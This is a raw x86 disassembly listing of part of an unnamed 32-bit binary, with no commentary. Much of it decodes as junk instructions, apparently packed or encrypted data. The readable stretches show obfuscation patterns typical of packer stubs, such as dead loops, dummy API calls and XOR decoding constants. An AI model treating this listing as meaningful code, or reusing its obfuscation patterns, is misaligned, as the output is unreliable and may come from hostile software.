  408b91:	scas   al,BYTE PTR es:[edi]
  408b92:	std    
  408b93:	dec    esp
  408b94:	pop    ebx
  408b95:	xor    ebx,esp
  408b97:	je     0x408b78
  408b99:	and    esi,DWORD PTR [ecx]
  408b9b:	out    dx,eax
  408b9c:	fadd   QWORD PTR ds:0xecfb89d7
  408ba2:	adc    al,0x32
  408ba4:	or     esi,edi
  408ba6:	lea    edi,[edi+ebx*1+0x32729b]
  408bad:	cmp    edi,edx
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	dec    edi
  408bd9:	or     ch,BYTE PTR [ebx]
  408bdb:	(bad)  
  408bdc:	and    eax,0x8a7e7ed0
  408be1:	jg     0x408c61
  408be3:	jle    0x408bb0
  408be5:	add    esp,esp
  408be7:	mov    cl,0x98
  408be9:	stos   DWORD PTR es:[edi],eax
  408bea:	jae    0x408bcb
  408bec:	push   DWORD PTR [edx+0x1]
  408bef:	(bad)  
  408bf0:	ss ins DWORD PTR es:[edi],dx
  408bf2:	xor    edi,DWORD PTR [ecx*8-0x3c192131]
  408bf9:	inc    ebp
  408bfa:	clc    
  408bfb:	mov    ds:0x82c8790,al
  408c01:	and    DWORD PTR [ebx-0x16],0xffffffe9
  408c05:	fcom   DWORD PTR [ebp-0x44]
  408c08:	sub    BYTE PTR [ecx],bl
  408c0a:	rol    BYTE PTR [ebx+0x4c],0xb1
  408c0e:	inc    eax
  408c0f:	je     0x408c19
  408c11:	lock adc BYTE PTR [edi-0x4630573a],bl
  408c18:	inc    ebx
  408c19:	mov    ebp,0xdda81a51
  408c1e:	jl     0x408c54
  408c20:	daa    
  408c21:	rol    DWORD PTR [edx-0x4b],1
  408c24:	pop    ds
  408c25:	xor    BYTE PTR [edx],al
  408c27:	popf   
  408c28:	test   BYTE PTR [edx+0x3e],al
  408c2b:	inc    ecx
  408c2c:	sub    BYTE PTR [esi+0x7d],bh
  408c2f:	pop    esp
  408c30:	dec    eax
  408c31:	fistp  DWORD PTR [edx-0x34]
  408c34:	and    al,0x8
  408c36:	push   ds
  408c37:	cmp    edi,eax
  408c39:	sub    dh,BYTE PTR [edi-0x2d]
  408c3c:	cs push esp
  408c3e:	jmp    FWORD PTR [ebp-0x62]
  408c41:	loope  0x408beb
  408c43:	sbb    cl,BYTE PTR [ecx-0x425dfd9c]
  408c49:	lods   eax,DWORD PTR ds:[esi]
  408c4a:	and    BYTE PTR [ebp-0x5a],ch
  408c4d:	loopne 0x408c20
  408c4f:	repnz mov dh,0xd3
  408c52:	jle    0x408c6d
  408c54:	jns    0x408c22
  408c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c57:	add    edi,DWORD PTR [edx]
  408c59:	or     BYTE PTR ds:0x998793a6,bl
  408c5f:	repnz xor dl,ch
  408c62:	bound  esi,QWORD PTR ss:[esi]
  408c65:	iret   
  408c66:	lds    ebp,FWORD PTR [edi+0x1c]
  408c69:	int3   
  408c6a:	fs int 0x3d
  408c6d:	imul   ebx,DWORD PTR [eax],0xffffffb2
  408c70:	fs retf 
  408c72:	les    ebp,FWORD PTR [ebx]
  408c74:	mov    eax,0xcb17d84c
  408c79:	xor    dl,BYTE PTR [edi+ebx*1]
  408c7c:	js     0x408cba
  408c7e:	imul   edx,DWORD PTR [esp+ecx*4],0xbb2eb76b
  408c85:	aad    0x9
  408c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c88:	rol    ebx,1
  408c8a:	push   cs
  408c8b:	test   al,0xe6
  408c8d:	mov    ecx,0xdcf6df8c
  408c92:	aas    
  408c93:	ror    ch,1
  408c95:	mov    BYTE PTR [eax+0x3e],cl
  408c98:	mov    al,ds:0xcfe92fb9
  408c9d:	mov    al,ds:0xecdaa2c
  408ca2:	fnstenv ds:0xc05119e1
  408ca8:	lods   al,BYTE PTR ds:[esi]
  408ca9:	mov    edi,DWORD PTR [esi-0x14d86ebc]
  408caf:	aad    0x2
  408cb1:	ja     0x408c7a
  408cb3:	or     DWORD PTR ds:0x802195a8,edi
  408cb9:	rcr    BYTE PTR [ecx],cl
  408cbb:	fst    DWORD PTR [ebx+0x708592bb]
  408cc1:	jecxz  0x408d0c
  408cc3:	arpl   WORD PTR [edi],bp
  408cc5:	or     eax,0x51d03941
  408cca:	mov    esp,0x4bf8e0bc
  408ccf:	iret   
  408cd0:	push   edx
  408cd1:	mov    edx,0xf330630d
  408cd6:	aaa    
  408cd7:	call   0x7c470267
  408cdc:	push   ss
  408cdd:	pop    edi
  408cde:	loopne 0x408ce7
  408ce0:	out    dx,al
  408ce1:	mov    edx,0x6b64029e
  408ce6:	jl     0x408c6b
  408ce8:	pop    ebp
  408ce9:	and    esp,esp
  408ceb:	sahf   
  408cec:	dec    eax
  408ced:	retf   0xd0d4
  408cf0:	sub    ah,BYTE PTR [ecx-0x6a]
  408cf3:	and    dh,BYTE PTR [eax]
  408cf5:	adc    DWORD PTR [ebx-0x11],ebx
  408cf8:	sub    ch,BYTE PTR [edi+0x3916e24d]
  408cfe:	sub    al,0xb7
  408d00:	and    eax,0xa8e00491
  408d05:	dec    esi
  408d06:	mov    edx,DWORD PTR [esi]
  408d08:	fdiv   QWORD PTR [esi]
  408d0a:	sbb    bh,BYTE PTR [esi+0x7d]
  408d0d:	pop    ebx
  408d0e:	popf   
  408d0f:	idiv   DWORD PTR [esi+eax*1-0x21df7a8c]
  408d16:	icebp  
  408d17:	sar    esi,cl
  408d19:	fild   DWORD PTR [ecx]
  408d1b:	push   esp
  408d1c:	bsr    ecx,DWORD PTR [esi-0x4c1ed95]
  408d23:	pop    ecx
  408d24:	and    dl,bh
  408d26:	outs   dx,DWORD PTR ds:[esi]
  408d27:	xchg   ecx,eax
  408d28:	ret    0xfb1b
  408d2b:	adc    al,0x92
  408d2d:	mov    bh,0xd6
  408d2f:	and    BYTE PTR [esi],al
  408d31:	adc    eax,0xa0e61aab
  408d36:	pop    ds
  408d37:	mov    esp,0xda9ae0d4
  408d3c:	xchg   sp,ax
  408d3e:	mov    al,0x36
  408d40:	(bad)  
  408d41:	int3   
  408d42:	cmp    BYTE PTR [esp+ecx*1+0x28],dl
  408d46:	inc    edx
  408d47:	xchg   edi,eax
  408d48:	stos   DWORD PTR es:[edi],eax
  408d49:	xchg   esi,eax
  408d4a:	ficom  WORD PTR [eax]
  408d4c:	mov    ?,WORD PTR [eax]
  408d4e:	js     0x408d8b
  408d50:	test   BYTE PTR [ebx+ebx*1-0x56ab255d],dl
  408d57:	push   ebx
  408d58:	in     eax,0x9
  408d5a:	cs mov dh,0xb2
  408d5d:	or     esi,esi
  408d5f:	ret    0x995c
  408d62:	adc    BYTE PTR [ebp-0x1d],0xed
  408d66:	mov    bl,0x20
  408d68:	pop    ebp
  408d69:	inc    edx
  408d6a:	and    cl,bh
  408d6c:	pop    ebx
  408d6d:	cmp    edi,esp
  408d6f:	pop    edi
  408d70:	push   ecx
  408d71:	(bad)  
  408d72:	mov    edi,0x77f58463
  408d77:	loope  0x408d7c
  408d79:	xlat   BYTE PTR ds:[ebx]
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	call   0xb144b299
  408daf:	sar    DWORD PTR [esi+0x7e],1
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408db5
  408db7:	jns    0x408de8
  408db9:	in     al,0xb7
  408dbb:	xchg   ebp,eax
  408dbc:	imul   ebx,DWORD PTR [esi+0x2db29181],0x8e29c7aa
  408dc6:	sub    BYTE PTR [esi+0x4f],dl
  408dc9:	pop    ecx
  408dca:	push   edx
  408dcb:	in     al,dx
  408dcc:	fisttp WORD PTR [eax+0x2a]
  408dcf:	mov    bh,0x34
  408dd1:	mov    ah,0x5a
  408dd3:	enter  0x1bbe,0x5e
  408dd7:	outs   dx,DWORD PTR ds:[esi]
  408dd8:	sti    
  408dd9:	pop    esi
  408dda:	and    al,0x38
  408ddc:	xor    al,0xeb
  408dde:	cmp    esi,ecx
  408de0:	stc    
  408de1:	mov    dh,0xe0
  408de3:	pop    es
  408de4:	test   DWORD PTR [ecx],esi
  408de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408de7:	das    
  408de8:	push   ebp
  408de9:	fwait
  408dea:	add    DWORD PTR [eax],0x25
  408ded:	jge    0x408e34
  408def:	or     al,0x59
  408df1:	rep stos DWORD PTR es:[edi],eax
  408df3:	jbe    0x408e5f
  408df5:	mov    dl,0xe2
  408df7:	in     al,dx
  408df8:	pop    ss
  408df9:	and    BYTE PTR gs:[esi],ah
  408dfc:	scas   al,BYTE PTR es:[edi]
  408dfd:	das    
  408dfe:	or     BYTE PTR [ebx],0x5a
  408e01:	inc    esi
  408e02:	sbb    eax,esi
  408e04:	jl     0x408e23
  408e06:	dec    ecx
  408e07:	pop    ss
  408e08:	sbb    al,0xc
  408e0a:	jmp    0x408db8
  408e0c:	fsub   QWORD PTR [ebx-0x77aa9228]
  408e12:	sbb    dl,BYTE PTR [ebp+eiz*8-0x7f982cd]
  408e19:	mul    dl
  408e1b:	cmp    ch,BYTE PTR [esi]
  408e1d:	das    
  408e1e:	xchg   DWORD PTR [eax+0x2bdfaf6f],eax
  408e24:	lea    ebp,[ecx]
  408e26:	dec    edx
  408e27:	inc    esi
  408e28:	fst    QWORD PTR [eax-0x638424eb]
  408e2e:	imul   esp,DWORD PTR [ebx],0x2d7a27db
  408e34:	pop    esi
  408e35:	in     eax,0xaf
  408e37:	mov    al,0xb9
  408e39:	test   DWORD PTR [edi],ebp
  408e3b:	out    0x4a,al
  408e3d:	int3   
  408e3e:	(bad)  
  408e3f:	out    0x5e,al
  408e41:	pop    esp
  408e42:	cs push 0x554a73a6
  408e48:	or     BYTE PTR [ebx-0x10],0x15
  408e4c:	mov    ch,0x13
  408e4e:	xchg   DWORD PTR [edi-0x1f],esp
  408e51:	xchg   DWORD PTR [edx-0x3c],ebx
  408e54:	aam    0x78
  408e56:	dec    esi
  408e57:	pop    ss
  408e58:	mov    BYTE PTR [ecx+0x1d],bl
  408e5b:	jge    0x408e45
  408e5d:	dec    edi
  408e5e:	stos   BYTE PTR es:[edi],al
  408e5f:	mov    al,0xfd
  408e61:	fcomp  QWORD PTR [edx]
  408e63:	mov    ebx,0x7799ec78
  408e68:	jo     0x408e92
  408e6a:	loopne 0x408e19
  408e6c:	lods   eax,DWORD PTR ds:[esi]
  408e6d:	test   eax,0x74f602a2
  408e72:	lods   al,BYTE PTR ds:[esi]
  408e73:	fcomp  QWORD PTR [esi+0x5a42863]
  408e79:	xchg   edx,eax
  408e7a:	push   es
  408e7b:	adc    al,0x1b
  408e7d:	sub    dh,BYTE PTR [ebx-0x2fbcf93a]
  408e83:	mov    ebx,0x64c3b063
  408e88:	bound  edx,QWORD PTR [ebx+0x50c72fc]
  408e8e:	daa    
  408e8f:	and    cl,dh
  408e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e92:	mov    al,ds:0xba74d290
  408e97:	fdivr  st,st(0)
  408e99:	mov    esp,0x9bb6c22a
  408e9e:	outs   dx,DWORD PTR ds:[esi]
  408e9f:	dec    ebx
  408ea0:	add    DWORD PTR [edx+0x5c],0xa65bc518
  408ea7:	loopne 0x408ede
  408ea9:	arpl   di,bx
  408eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eac:	in     eax,0xff
  408eae:	dec    ebx
  408eaf:	call   0xd421:0xe8a0f870
  408eb6:	mov    ebx,0x35ad6e43
  408ebb:	xchg   ebx,eax
  408ebc:	jo     0x408e51
  408ebe:	retf   
  408ebf:	loope  0x408f3f
  408ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ec2:	jbe    0x408e82
  408ec4:	xchg   ebx,eax
  408ec5:	call   0xc951:0xac6f7c1b
  408ecc:	hlt    
  408ecd:	ror    BYTE PTR [edx-0x5b2bca86],cl
  408ed3:	push   esp
  408ed4:	gs adc eax,eax
  408ed7:	pop    ecx
  408ed8:	jl     0x408ebb
  408eda:	mov    esi,0x47726cd7
  408edf:	fistp  QWORD PTR [edx+0x6d]
  408ee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee3:	mov    es,WORD PTR fs:[edi+edx*1]
  408ee7:	stos   BYTE PTR es:[edi],al
  408ee8:	out    dx,al
  408ee9:	clc    
  408eea:	loope  0x408e8f
  408eec:	cmp    DWORD PTR [ebx+ebx*4],ecx
  408eef:	out    0xe8,eax
  408ef1:	mov    ds:0xf046ec95,eax
  408ef6:	pmaddwd mm4,mm6
  408ef9:	leave  
  408efa:	dec    esi
  408efb:	jns    0x408eaa
  408efd:	iret   
  408efe:	push   0xe4342c28
  408f03:	cwde   
  408f04:	outs   dx,DWORD PTR ds:[esi]
  408f05:	int    0x1c
  408f07:	jb     0x408f5e
  408f09:	in     al,0xf3
  408f0b:	cmp    al,0x8a
  408f0d:	js     0x408ef5
  408f0f:	sbb    ah,BYTE PTR [ebp-0x4a55042f]
  408f15:	dec    al
  408f17:	xchg   ebx,eax
  408f18:	out    dx,eax
  408f19:	add    dl,bl
  408f1b:	push   edx
  408f1c:	lods   eax,DWORD PTR ds:[esi]
  408f1d:	imul   DWORD PTR [edi+0x5f224877]
  408f23:	test   eax,0xf505540f
  408f28:	les    ebx,FWORD PTR [esi+0x58]
  408f2b:	dec    ebp
  408f2c:	(bad)  
  408f2d:	pop    edi
  408f2e:	xchg   DWORD PTR [esi+0x464a2802],ebx
  408f34:	shl    BYTE PTR [edx],1
  408f36:	jb     0x408f68
  408f38:	jno    0x408ee7
  408f3a:	push   ss
  408f3b:	out    dx,eax
  408f3c:	pop    es
  408f3d:	mov    ebx,0xb99e9378
  408f42:	xor    al,0xac
  408f44:	jbe    0x408f14
  408f46:	xor    BYTE PTR ds:0x5d8b84c9,0xf8
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	repz inc ecx
  408f62:	add    eax,0x7edfcdd3
  408f67:	jle    0x408ef3
  408f69:	jg     0x408fe9
  408f6b:	jle    0x408fd3
  408f6d:	jmp    0x7bad:0xdb77771
  408f74:	out    0xec,al
  408f76:	inc    eax
  408f77:	inc    ebp
  408f78:	sub    DWORD PTR [eax],esp
  408f7a:	or     cl,ah
  408f7c:	aam    0xa4
  408f7e:	mov    al,ds:0x66723980
  408f83:	out    dx,eax
  408f84:	shl    DWORD PTR [eax+0x31],1
  408f87:	test   eax,0x29663ee1
  408f8c:	dec    edi
  408f8d:	dec    esi
  408f8e:	sbb    al,0x44
  408f90:	lock aad 0x87
  408f93:	das    
  408f94:	lods   al,BYTE PTR ds:[esi]
  408f95:	mov    dh,0x33
  408f97:	and    DWORD PTR [edx],edi
  408f99:	dec    edi
  408f9a:	jns    0x408f76
  408f9c:	push   edi
  408f9d:	dec    ecx
  408f9e:	fistp  QWORD PTR [ebp+0x34]
  408fa1:	aam    0x2c
  408fa3:	dec    ecx
  408fa4:	mov    ?,eax
  408fa6:	stc    
  408fa7:	push   ebx
  408fa8:	out    dx,eax
  408fa9:	push   ebp
  408faa:	gs aaa 
  408fac:	hlt    
  408fad:	lea    edi,[esi-0xc626cb5]
  408fb3:	xchg   esi,eax
  408fb4:	push   0xbfc65b4a
  408fb9:	out    dx,al
  408fba:	cmp    BYTE PTR [ebx],al
  408fbc:	and    BYTE PTR [eax+0x23],bh
  408fbf:	arpl   WORD PTR ds:0x718422ed,bx
  408fc5:	imul   BYTE PTR [ebx]
  408fc7:	cmp    eax,DWORD PTR [ebp+ebx*1-0x1]
  408fcb:	adc    eax,0x3a6a6186
  408fd0:	dec    ebp
  408fd1:	hlt    
  408fd2:	push   es
  408fd3:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408fd5:	repz xchg ebx,eax
  408fd7:	cli    
  408fd8:	add    eax,0x41de6a09
  408fdd:	arpl   WORD PTR [esi],di
  408fdf:	xor    DWORD PTR [ebp-0x6c],ebx
  408fe2:	dec    dh
  408fe4:	aad    0x3a
  408fe6:	iret   
  408fe7:	jp     0x40903b
  408fe9:	pop    ss
  408fea:	xor    dl,ch
  408fec:	int3   
  408fed:	stc    
  408fee:	sub    DWORD PTR [ebx+0x66],ebx
  408ff1:	push   esp
  408ff2:	cmp    BYTE PTR [eax-0x6a],bl
  408ff5:	data16 aaa 
  408ff7:	aam    0x81
  408ff9:	sahf   
  408ffa:	push   es
  408ffb:	idiv   BYTE PTR [esi]
  408ffd:	ds (bad) 
  408fff:	jb     0x409051
  409001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409002:	repnz shl BYTE PTR [ecx],0x2f
  409006:	and    DWORD PTR [esi+0x5c],ebp
  409009:	popa   
  40900a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40900b:	icebp  
  40900c:	jno    0x408fa5
  40900e:	jp     0x409065
  409010:	jge    0x408fdb
  409012:	in     al,0xee
  409014:	jmp    0xae16:0xc5a8e1f
  40901b:	mov    edi,0x613dda8
  409020:	arpl   WORD PTR cs:[esi],cx
  409023:	and    eax,0x4b063517
  409028:	sub    BYTE PTR [edx-0x3666c42b],0xe
  40902f:	je     0x408fcf
  409031:	in     eax,dx
  409032:	mov    bh,0x16
  409034:	xchg   edi,eax
  409035:	mov    ecx,edx
  409037:	mov    ss,WORD PTR [ebp-0x206074d5]
  40903d:	test   DWORD PTR [eax+0x6],esi
  409040:	push   cs
  409041:	sub    edi,DWORD PTR [ebx+0x4]
  409044:	or     ah,bl
  409046:	push   ds
  409047:	xchg   edx,eax
  409048:	inc    eax
  409049:	sbb    eax,0x1952e806
  40904e:	cmp    DWORD PTR ds:0xd9ebe745,esp
  409054:	adc    al,0x5b
  409056:	or     ch,cl
  409058:	and    dl,BYTE PTR [edi+0x4170cf19]
  40905e:	mov    ebx,0x9e5f9817
  409063:	shl    DWORD PTR [edi],cl
  409065:	xchg   edx,eax
  409066:	aaa    
  409067:	mov    ds:0x964459b8,al
  40906c:	out    dx,al
  40906d:	mov    ah,0x26
  40906f:	cmp    DWORD PTR [eax-0x1ebba96b],edx
  409075:	mov    edi,0x18ee0dc
  40907a:	fidivr WORD PTR [edi-0xfd6399f]
  409080:	addr16 mov edi,0xa6a0badc
  409086:	aad    0x6
  409088:	mov    ebp,0x23236934
  40908d:	sub    al,0xd6
  40908f:	cmp    edx,ecx
  409091:	cmp    DWORD PTR [ecx-0x66533be9],eax
  409097:	arpl   WORD PTR [eax+edx*8],di
  40909a:	outs   dx,BYTE PTR ds:[esi]
  40909b:	shl    BYTE PTR [ecx],1
  40909d:	test   DWORD PTR [ebx+0x23],ecx
  4090a0:	add    ah,ch
  4090a2:	arpl   WORD PTR [eax+eiz*1+0x14341cad],sp
  4090a9:	pop    ss
  4090aa:	repz and DWORD PTR [eax+0x17792ac5],edi
  4090b1:	add    al,0xf6
  4090b3:	sub    DWORD PTR [ecx-0x7a],ecx
  4090b6:	xchg   ecx,eax
  4090b7:	shl    bh,1
  4090b9:	add    BYTE PTR ds:0xc770b3c2,ch
  4090bf:	std    
  4090c0:	scas   eax,DWORD PTR es:[edi]
  4090c1:	addr16 dec esp
  4090c3:	ret    0x527b
  4090c6:	cli    
  4090c7:	xlat   BYTE PTR ds:[ebx]
  4090c8:	pushf  
  4090c9:	mov    dl,0xab
  4090cb:	dec    ebx
  4090cc:	pusha  
  4090cd:	push   ss
  4090ce:	icebp  
  4090cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090d0:	cdq    
  4090d1:	icebp  
  4090d2:	mov    ch,0xa9
  4090d4:	ins    BYTE PTR es:[edi],dx
  4090d5:	mov    edi,0x83928eff
  4090da:	fld    QWORD PTR ds:0x9314bb73
  4090e0:	stos   BYTE PTR es:[edi],al
  4090e1:	jb     0x409076
  4090e3:	push   edx
  4090e4:	pop    eax
  4090e5:	pop    edx
  4090e6:	je     0x409107
  4090e8:	and    ebp,DWORD PTR [edx-0x217edf24]
  4090ee:	jge    0x409078
  4090f0:	sbb    DWORD PTR [ebp-0x40c4e9a2],ebx
  4090f6:	jge    0x4090c0
  4090f8:	out    0x83,al
  4090fa:	rcr    BYTE PTR [ecx+0x18ca9ed2],1
  409100:	add    edx,ecx
  409102:	imul   edx,ebx
  409105:	cmp    edx,edi
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e8b7
  40911f:	and    DWORD PTR ds:0x43035b,0x4302bd
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ec5b,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x430363,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e658,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e8f7
  40916b:	sbb    DWORD PTR ds:0x4302c1,0x4302f1
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42ec4b,0x624a
  409184:	call   DWORD PTR ds:0x42e8bf
  40918a:	adc    DWORD PTR ds:0x42e640,0x4302dd
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x4302d1,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x4302b5,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x4302ed,0x42e654
  4091c4:	call   DWORD PTR ds:0x42e963
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e648
  4091d6:	and    DWORD PTR ds:0x4302d9,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x4302b9,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ec5b,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ec5b,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e863
  409219:	mov    ecx,DWORD PTR ds:0x42ec5b
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ec5b,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ec63,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ec5f
  409243:	sbb    eax,DWORD PTR ds:0x42ec5b
  409249:	mov    ds:0x42ec5f,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ec5b
  409261:	and    DWORD PTR ds:0x42e63c,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x4302d5,0x430357
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e64c,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x4302d5,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42ec4b,0x430367
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42ec4b,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x4302c9,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x4302d9,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ec63,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e648,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x4302b5,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e87f
  40930f:	adc    DWORD PTR ds:0x42ec5f,0x42e64c
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x4302d5,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x4302d1,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x4302d1
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x4302d1,ecx
  409352:	cmp    DWORD PTR ds:0x4302d1,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x4302d1,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e867
  409375:	cmp    DWORD PTR ds:0x4302d1,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x4302d1
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x4302d1,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42ec4b
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e7e7
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x430353,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x43036b,0x17
  4093b9:	cmp    DWORD PTR ds:0x43036b,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x43036b,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e86b
  4093df:	cmp    DWORD PTR ds:0x43036b,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x43036b
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x43036b,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x43036b
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x43036b,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x43035f,0x10
  409415:	cmp    DWORD PTR ds:0x43035f,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x43035f,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e86f
  409438:	mov    ecx,DWORD PTR ds:0x43035f
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x43035f,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x4302e1
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x4302e9,0x16
  409461:	cmp    DWORD PTR ds:0x4302e9,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x4302e9,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e873
  409481:	mov    ecx,DWORD PTR ds:0x4302e9
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x4302e9,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42ec4f,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42ec4f
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42ec4f,ecx
  4094b7:	cmp    DWORD PTR ds:0x42ec4f,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42ec4f,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e77b
  4094d6:	push   0x42e725
  4094db:	call   DWORD PTR ds:0x42eaab
